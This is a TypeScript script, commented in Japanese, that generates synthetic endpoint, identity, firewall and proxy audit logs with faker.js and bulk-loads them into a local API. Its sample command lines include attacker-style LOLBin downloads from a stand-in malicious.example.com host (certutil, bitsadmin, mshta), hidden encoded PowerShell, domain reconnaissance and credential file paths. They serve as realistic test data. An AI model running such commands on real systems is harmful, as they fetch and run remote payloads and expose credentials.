// 監査ログを生成してAPIに投入するスクリプト
// CLIで件数を指定して実行し、DBに登録
// faker.jsでリアルな監査ログデータを生成する

import { faker } from '@faker-js/faker';
import axios from 'axios';
import { Command } from 'commander';

const API_URL = 'http://localhost:3000';
const BATCH_SIZE = 500;
// サンプルアカウント（トークン使用のため）
const TENANT_ACCOUNTS = [
  { email: 'user-a@example.com', password: 'password123' },
  { email: 'user-c@example.com', password: 'password123' },
];

// サンプルデータ定義
const hostnames = Array.from({ length: 50 }, (_, i) => `pc-${String(i + 1).padStart(3, '0')}`);
const servernames = Array.from({ length: 10 }, (_, i) => `srv-${String(i + 1).padStart(3, '0')}`);
const userIds = ['tanaka', 'suzuki', 'yamamoto', 'sato', 'takahashi', 'kobayashi', 'watanabe', 'ito', 'nakamura', 'kato'];
const domains = ['corp.example.com'];

// サンプルユーザー生成
function randomUser() {
  const id = faker.helpers.arrayElement(userIds);
  return { userid: id, email: `${id}@${domains[0]}` };
}

// ログタイプ別の定義
const LOG_TYPE_CONFIGS = {
  MICROSOFT_DEFENDER_ENDPOINT: {
    vendorName: 'Microsoft',
    productName: 'Defender for Endpoint',
    eventTypes: ['PROCESS_LAUNCH', 'FILE_CREATION', 'FILE_MODIFICATION', 'NETWORK_CONNECTION'],
    generate: () => {
      const user = randomUser();
      const hostname = faker.helpers.arrayElement(hostnames);
      return {
        principal_hostname: hostname,
        principal_ip: `10.0.${faker.number.int({ min: 1, max: 254 })}.${faker.number.int({ min: 1, max: 254 })}`,
        principal_user_userid: user.userid,
        principal_user_email: user.email,
        principal_process_pid: faker.number.int({ min: 100, max: 65535 }).toString(),
        principal_process_commandLine: faker.helpers.arrayElement([
          'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgA',
          'cmd.exe /c whoami /all',
          'cmd.exe /c net user /domain',
          'cmd.exe /c ipconfig /all',
          'notepad.exe C:\\Users\\Public\\memo.txt',
          'regedit.exe',
          'svchost.exe -k netsvcs -p',
          'explorer.exe',
          'chrome.exe --no-sandbox --disable-gpu',
          'msedge.exe https://login.microsoftonline.com',
          'outlook.exe /recycle',
          'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
          'certutil.exe -urlcache -split -f http://malicious.example.com/payload.exe',
          'bitsadmin.exe /transfer myJob http://malicious.example.com/file.exe C:\\temp\\file.exe',
          'wscript.exe C:\\Users\\Public\\update.vbs',
          'mshta.exe http://malicious.example.com/shell.hta',
        ]),
        target_hostname: undefined,
        target_ip: undefined,
        target_user_userid: undefined,
        target_user_email: undefined,
        target_url: undefined,
        target_resourceName: faker.helpers.arrayElement([
          'C:\\Windows\\System32\\cmd.exe',
          'C:\\Users\\Public\\Downloads\\invoice.pdf.exe',
          'C:\\temp\\payload.dll',
          'C:\\Windows\\Temp\\svchost.exe',
          `C:\\Users\\${user.userid}\\Documents\\report.docx`,
          `C:\\Users\\${user.userid}\\Desktop\\quarterly_data.xlsx`,
        ]),
      };
    },
    generateSecurityResult: () => {
      const isMalicious = Math.random() < 0.12;
      const isSuspicious = !isMalicious && Math.random() < 0.15;
      if (isMalicious) {
        return {
          action: faker.helpers.arrayElement(['BLOCK', 'QUARANTINE']),
          severity: faker.helpers.arrayElement(['HIGH', 'CRITICAL']),
          description: faker.helpers.arrayElement([
            "'Ludicrouz' malware was detected",
            'Suspicious process injection detected',
            'Ransomware behavior detected',
            'Credential dumping tool detected',
            'Living-off-the-land binary (LOLBin) abuse',
          ]),
          category: faker.helpers.arrayElement(['SOFTWARE_MALICIOUS', 'EXPLOIT']),
        };
      }
      if (isSuspicious) {
        return {
          action: 'ALLOW',
          severity: 'MEDIUM',
          description: faker.helpers.arrayElement([
            'Suspicious command line detected',
            'Unusual process execution',
            'Anomalous PowerShell activity',
            'Suspicious URL clicked',
          ]),
          category: 'SOFTWARE_SUSPICIOUS',
        };
      }
      return {
        action: 'ALLOW',
        severity: 'LOW',
        description: 'Process execution normal',
        category: 'SOFTWARE_PROCESS',
      };
    },
  },

  TRENDMICRO_APEX_ONE: {
    vendorName: 'Trend Micro',
    productName: 'Apex One SaaS',
    eventTypes: ['PROCESS_LAUNCH', 'FILE_CREATION', 'SCAN_HOST'],
    generate: () => {
      const hostname = faker.helpers.arrayElement(servernames);
      return {
        principal_hostname: hostname,
        principal_ip: `172.16.${faker.number.int({ min: 1, max: 10 })}.${faker.number.int({ min: 1, max: 254 })}`,
        principal_user_userid: 'SYSTEM',
        principal_user_email: undefined,
        principal_process_pid: faker.number.int({ min: 1000, max: 65535 }).toString(),
        principal_process_commandLine: faker.helpers.arrayElement([
          'w3wp.exe -ap "DefaultAppPool"',
          'sqlservr.exe -sMSSQLSERVER',
          'java.exe -jar /opt/app/server.jar',
          'httpd.exe -k start',
          'svchost.exe -k netsvcs',
          'services.exe',
          'lsass.exe',
          'powershell.exe -File C:\\Scripts\\backup.ps1',
          'cmd.exe /c schtasks /create /tn "Update" /tr C:\\temp\\update.exe',
          'certutil.exe -decode encoded.txt payload.exe',
        ]),
        target_hostname: undefined,
        target_ip: undefined,
        target_user_userid: undefined,
        target_user_email: undefined,
        target_url: undefined,
        target_resourceName: faker.helpers.arrayElement([
          '/var/log/syslog',
          '/opt/app/server.jar',
          'C:\\inetpub\\wwwroot\\web.config',
          'C:\\Windows\\System32\\config\\SAM',
          'C:\\ProgramData\\update.exe',
          '/etc/passwd',
          '/tmp/backdoor.sh',
        ]),
      };
    },
    generateSecurityResult: () => {
      const isMalicious = Math.random() < 0.08;
      if (isMalicious) {
        return {
          action: faker.helpers.arrayElement(['BLOCK', 'QUARANTINE']),
          severity: faker.helpers.arrayElement(['HIGH', 'CRITICAL']),
          description: faker.helpers.arrayElement([
            'Webshell detected on server',
            'Cryptocurrency miner detected',
            'Rootkit behavior detected',
            'Backdoor trojan detected',
          ]),
          category: 'SOFTWARE_MALICIOUS',
        };
      }
      return {
        action: 'ALLOW',
        severity: 'LOW',
        description: faker.helpers.arrayElement([
          'Scheduled scan completed',
          'Real-time scan: no threat found',
          'Server process execution normal',
        ]),
        category: 'SOFTWARE_PROCESS',
      };
    },
  },

  AZURE_AD: {
    vendorName: 'Microsoft',
    productName: 'Azure AD',
    eventTypes: ['USER_LOGIN', 'USER_LOGOUT', 'USER_RESOURCE_ACCESS', 'USER_CREATION'],
    generate: () => {
      const user = randomUser();
      const isRemote = Math.random() < 0.3;
      return {
        principal_hostname: isRemote ? undefined : faker.helpers.arrayElement(hostnames),
        principal_ip: isRemote
          ? faker.internet.ipv4()
          : `10.0.${faker.number.int({ min: 1, max: 254 })}.${faker.number.int({ min: 1, max: 254 })}`,
        principal_user_userid: user.userid,
        principal_user_email: user.email,
        principal_process_pid: undefined,
        principal_process_commandLine: undefined,
        target_hostname: undefined,
        target_ip: undefined,
        target_user_userid: undefined,
        target_user_email: undefined,
        target_url: faker.helpers.arrayElement([
          'https://login.microsoftonline.com',
          'https://portal.azure.com',
          'https://outlook.office365.com',
          'https://teams.microsoft.com',
          'https://sharepoint.com/sites/corporate',
        ]),
        target_resourceName: faker.helpers.arrayElement([
          'Microsoft Office 365',
          'Azure Portal',
          'Microsoft Teams',
          'SharePoint Online',
          'OneDrive for Business',
        ]),
      };
    },
    generateSecurityResult: () => {
      const isFailed = Math.random() < 0.1;
      const isSuspicious = !isFailed && Math.random() < 0.05;
      if (isFailed) {
        return {
          action: 'BLOCK',
          severity: faker.helpers.arrayElement(['MEDIUM', 'HIGH']),
          description: faker.helpers.arrayElement([
            'Invalid password attempt',
            'Account locked out',
            'MFA verification failed',
            'Conditional access policy blocked',
            'Sign-in from unfamiliar location',
          ]),
          category: 'AUTH_VIOLATION',
        };
      }
      if (isSuspicious) {
        return {
          action: 'ALLOW',
          severity: 'MEDIUM',
          description: faker.helpers.arrayElement([
            'Impossible travel detected',
            'Sign-in from anonymous IP',
            'Atypical travel',
          ]),
          category: 'AUTH_SUSPICIOUS',
        };
      }
      return {
        action: 'ALLOW',
        severity: 'LOW',
        description: 'Sign-in successful',
        category: 'AUTH_ACTIVITY',
      };
    },
  },

  OFFICE_365: {
    vendorName: 'Microsoft',
    productName: 'Office 365',
    eventTypes: ['USER_RESOURCE_ACCESS', 'USER_RESOURCE_UPDATE_CONTENT', 'USER_RESOURCE_CREATION'],
    generate: () => {
      const user = randomUser();
      return {
        principal_hostname: faker.helpers.arrayElement(hostnames),
        principal_ip: `10.0.${faker.number.int({ min: 1, max: 254 })}.${faker.number.int({ min: 1, max: 254 })}`,
        principal_user_userid: user.userid,
        principal_user_email: user.email,
        principal_process_pid: undefined,
        principal_process_commandLine: undefined,
        target_hostname: undefined,
        target_ip: undefined,
        target_user_userid: undefined,
        target_user_email: undefined,
        target_url: faker.helpers.arrayElement([
          'https://outlook.office365.com/mail',
          'https://outlook.office365.com/calendar',
          `https://${domains[0].replace('corp.', '')}.sharepoint.com/sites/project`,
          `https://${domains[0].replace('corp.', '')}-my.sharepoint.com/personal/${faker.helpers.arrayElement(userIds)}`,
          'https://teams.microsoft.com/channel/general',
        ]),
        target_resourceName: faker.helpers.arrayElement([
          '2026年度_予算計画.xlsx',
          '取締役会議事録_Q1.docx',
          '顧客リスト_機密.csv',
          'プロジェクト進捗報告.pptx',
          'パスワード管理表.xlsx',
          'サーバー構成図.vsdx',
          '採用候補者リスト.xlsx',
          'メール転送ルール',
          '外部共有リンク',
        ]),
      };
    },
    generateSecurityResult: () => {
      const isSuspicious = Math.random() < 0.08;
      if (isSuspicious) {
        return {
          action: faker.helpers.arrayElement(['ALLOW', 'BLOCK']),
          severity: faker.helpers.arrayElement(['MEDIUM', 'HIGH']),
          description: faker.helpers.arrayElement([
            'Mass file download detected',
            'Email forwarding rule created to external address',
            'Sensitive file shared externally',
            'Mailbox delegation added',
            'Bulk delete operation',
          ]),
          category: 'DATA_EXFILTRATION',
        };
      }
      return {
        action: 'ALLOW',
        severity: 'LOW',
        description: faker.helpers.arrayElement([
          'File accessed',
          'File modified',
          'Email sent',
          'Calendar event created',
          'Teams message posted',
        ]),
        category: 'USER_ACTIVITY',
      };
    },
  },

  PALO_ALTO_FIREWALL: {
    vendorName: 'Palo Alto Networks',
    productName: 'PA-Series Firewall',
    eventTypes: ['NETWORK_CONNECTION'],
    generate: () => {
      const isOutbound = Math.random() < 0.7;
      return {
        principal_hostname: undefined,
        principal_ip: isOutbound
          ? `10.0.${faker.number.int({ min: 1, max: 254 })}.${faker.number.int({ min: 1, max: 254 })}`
          : faker.internet.ipv4(),
        principal_user_userid: isOutbound ? faker.helpers.arrayElement(userIds) : undefined,
        principal_user_email: undefined,
        principal_process_pid: undefined,
        principal_process_commandLine: undefined,
        target_hostname: undefined,
        target_ip: isOutbound
          ? faker.internet.ipv4()
          : `10.0.${faker.number.int({ min: 1, max: 254 })}.${faker.number.int({ min: 1, max: 254 })}`,
        target_user_userid: undefined,
        target_user_email: undefined,
        target_url: isOutbound
          ? faker.helpers.arrayElement([
              `https://${faker.internet.domainName()}`,
              `http://${faker.internet.ipv4()}:${faker.helpers.arrayElement([8080, 8443, 4443, 9090])}`,
              `https://${faker.internet.domainName()}/api/v1/data`,
              undefined,
            ]) as string | undefined
          : undefined,
        target_resourceName: undefined,
      };
    },
    generateSecurityResult: () => {
      const isBlocked = Math.random() < 0.15;
      const isThreat = !isBlocked && Math.random() < 0.05;
      if (isBlocked) {
        return {
          action: 'BLOCK',
          severity: faker.helpers.arrayElement(['MEDIUM', 'HIGH']),
          description: faker.helpers.arrayElement([
            'Traffic denied by security policy',
            'Connection to known C2 server blocked',
            'Port scan detected and blocked',
            'DNS sinkhole: malicious domain blocked',
            'Outbound connection to TOR exit node blocked',
          ]),
          category: 'NETWORK_SUSPICIOUS',
        };
      }
      if (isThreat) {
        return {
          action: 'ALLOW',
          severity: 'MEDIUM',
          description: faker.helpers.arrayElement([
            'Unusual outbound traffic pattern',
            'Connection to newly registered domain',
            'High-frequency beaconing detected',
          ]),
          category: 'NETWORK_SUSPICIOUS',
        };
      }
      return {
        action: 'ALLOW',
        severity: 'LOW',
        description: 'Traffic allowed by policy',
        category: 'NETWORK_CONNECTION',
      };
    },
  },

  ZSCALER_WEBPROXY: {
    vendorName: 'Zscaler',
    productName: 'Zscaler Internet Access',
    eventTypes: ['NETWORK_HTTP'],
    generate: () => {
      const user = randomUser();
      return {
        principal_hostname: faker.helpers.arrayElement(hostnames),
        principal_ip: `10.0.${faker.number.int({ min: 1, max: 254 })}.${faker.number.int({ min: 1, max: 254 })}`,
        principal_user_userid: user.userid,
        principal_user_email: user.email,
        principal_process_pid: undefined,
        principal_process_commandLine: undefined,
        target_hostname: undefined,
        target_ip: faker.internet.ipv4(),
        target_user_userid: undefined,
        target_user_email: undefined,
        target_url: faker.helpers.arrayElement([
          `https://${faker.internet.domainName()}/login`,
          `https://drive.google.com/file/d/${faker.string.alphanumeric(20)}`,
          `https://www.dropbox.com/s/${faker.string.alphanumeric(15)}`,
          'https://github.com/org/repo/archive/main.zip',
          `https://${faker.internet.domainName()}/wp-admin/install.php`,
          `http://${faker.internet.domainName()}/download/update.exe`,
          'https://login.microsoftonline.com/common/oauth2/authorize',
          `https://${faker.string.alphanumeric(8)}.xyz/payload`,
          'https://docs.google.com/spreadsheets/d/export',
          `https://wetransfer.com/downloads/${faker.string.alphanumeric(20)}`,
        ]),
        target_resourceName: undefined,
      };
    },
    generateSecurityResult: () => {
      const isBlocked = Math.random() < 0.1;
      const isCautioned = !isBlocked && Math.random() < 0.08;
      if (isBlocked) {
        return {
          action: 'BLOCK',
          severity: faker.helpers.arrayElement(['MEDIUM', 'HIGH']),
          description: faker.helpers.arrayElement([
            'Malicious URL blocked',
            'Phishing site blocked',
            'File download blocked: executable from uncategorized site',
            'Cloud storage upload blocked by DLP policy',
            'Access to newly registered domain blocked',
          ]),
          category: faker.helpers.arrayElement(['NETWORK_MALICIOUS', 'POLICY_VIOLATION']),
        };
      }
      if (isCautioned) {
        return {
          action: 'ALLOW',
          severity: 'MEDIUM',
          description: faker.helpers.arrayElement([
            'SSL inspection bypassed',
            'Access to file sharing site',
            'Large file upload detected',
          ]),
          category: 'NETWORK_SUSPICIOUS',
        };
      }
      return {
        action: 'ALLOW',
        severity: 'LOW',
        description: 'Web access allowed',
        category: 'NETWORK_CONNECTION',
      };
    },
  },
};
// ログタイプ型を定義
type LogType = keyof typeof LOG_TYPE_CONFIGS;

// サンプルイベント生成
function generateEvent(logType: LogType, namespaceId: string) {
  const config = LOG_TYPE_CONFIGS[logType];
  const fields = config.generate();

  return {
    namespaceId,
    metadata_eventTimestamp: faker.date.recent({ days: 30 }).toISOString(),
    metadata_eventType: faker.helpers.arrayElement(config.eventTypes),
    metadata_logType: logType,
    metadata_vendorName: config.vendorName,
    metadata_productName: config.productName,
    ...fields,
    securityResults: [config.generateSecurityResult()],
  };
}

// ログインしてトークンを取得
async function login(email: string, password: string): Promise<string> {
  const response = await axios.post(`${API_URL}/auth/login`, { email, password });
  return response.data.accessToken;
}

// Namespace一覧を取得
async function getNamespaces(token: string): Promise<any[]> {
  const response = await axios.get(`${API_URL}/settings/namespaces`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  return response.data;
}

// 一括登録
async function sendBatch(events: any[], token: string) {
  const response = await axios.post(
    `${API_URL}/events/bulk`,
    { events },
    { 
      headers: { Authorization: `Bearer ${token}` },
    }
  );
  return response.data;
}

// メイン処理
async function main() {
  const program = new Command();
  program
    .requiredOption('--count <number>', '生成件数（テナントあたり）', parseInt)
    .parse();

  const opts = program.opts();
  const count = opts.count as number;
  const logTypes = Object.keys(LOG_TYPE_CONFIGS) as LogType[];
  const perType = Math.ceil(count / logTypes.length);
  console.log(`${TENANT_ACCOUNTS.length} テナント × ${logTypes.length} ログタイプ × ${perType} 件\n`);

  let totalSent = 0;
  const startTime = Date.now();

  for (const account of TENANT_ACCOUNTS) {
    // ログインしてトークン取得
    console.log(`${account.email} でログイン...`);
    const token = await login(account.email, account.password);

    // namespace一覧を取得
    const namespaces = await getNamespaces(token);
    console.log(`Namespace: ${namespaces.map((ns: any) => ns.name).join(', ')}`);

    // ログタイプごとにイベント生成・投入
    for (const logType of logTypes) {
      console.log(`${logType} (${LOG_TYPE_CONFIGS[logType].productName})`);

      for (let i = 0; i < perType; i += BATCH_SIZE) {
        const batchSize = Math.min(BATCH_SIZE, perType - i);
        const events = Array.from({ length: batchSize }, () => {
          const namespace = faker.helpers.arrayElement(namespaces);
          return generateEvent(logType, namespace.id);
        });

        const result = await sendBatch(events, token);
        totalSent += result.count;

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        console.log(`${totalSent} 件完了 (${elapsed}s)`);
      }
    }
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
  console.log(`${totalSent} 件を ${totalTime} 秒で投入完了しました\n`);
}

main().catch((err) => {
  console.error('エラー全体:', err);
  process.exit(1);
});